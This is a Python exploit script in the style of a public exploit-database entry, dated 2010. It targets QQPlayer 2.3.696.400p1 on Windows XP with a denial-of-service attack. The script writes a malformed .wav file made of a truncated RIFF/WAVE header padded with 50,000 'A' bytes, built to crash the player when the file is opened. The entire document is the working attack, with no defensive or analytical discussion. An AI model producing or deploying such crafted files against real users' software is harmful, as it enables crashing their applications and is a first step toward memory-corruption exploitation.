#!/usr/bin/python
#
###########################################################################################		
# Exploit Title:  QQPlayer 2.3.696.400p1(.wav) Denial of Service Vulnerability       
# Date:		  07-09-2010                                                            
# Author:	  Hadji Samir   , s-Dz[at]hotmail[dot]fr                                
# Software Link:  www.qq.com                                                            
# Version:        QQPlayer 2.3.696.400p1                                                
# Tested on:	  Windows XP sp2                                                        
# CVE :                                                                                 
# Notes:	  Working with filetype Mahboul-3lik.wav (.mp3,.3gp,.avi...)           
#                 Samir tjrs mahboul-3lik ...                                           
#                                                                                                                                
###########################################################################################	
  
boom =("\x52\x49\x46\x46\x24\x80\x03\x20\x57\x41\x56\x45\x20")
buff = ("\x41" * 50000 )
wizz = open("Mahboul-3lik.wav","w") 
wizz.write(boom + buff ) 
wizz.close()